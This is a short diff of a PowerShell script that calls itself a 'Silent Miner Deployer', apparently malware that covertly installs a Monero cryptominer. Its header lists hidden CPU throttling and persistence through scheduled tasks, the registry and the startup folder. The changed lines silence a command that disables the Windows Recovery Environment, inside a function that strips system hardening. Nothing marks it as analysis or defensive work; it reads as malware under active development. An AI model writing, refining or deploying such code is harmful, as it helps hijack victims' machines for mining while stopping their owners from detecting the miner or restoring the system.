@@ -1,5 +1,5 @@
 # ============================================================
-#  XMR Silent Miner Deployer v3 (ULTRA HARDENED)
+#  XMR Silent Miner Deployer v3 (ULTRA HARDENED + SILENT FIX)
 #  - Pulls config from PUBLIC GitHub repo
 #  - Dynamic idle/active CPU throttle
 #  - Survives reboots (schtasks + registry + startup folder)
@@ -35,8 +35,9 @@ $worker = "$env:COMPUTERNAME"
 
 function Disable-WindowsHardening {
     # ── 1. Disable Windows Recovery Environment (WinRE) ──
+    # [FIXED] Using native redirection for 100% silence in CMD
     try {
-        reagentc.exe /disable /erroraction silentlycontinue
+        & reagentc.exe /disable >$null 2>$null
     } catch {}
 
     # ── 2. Block Reset Page in Settings UI ──
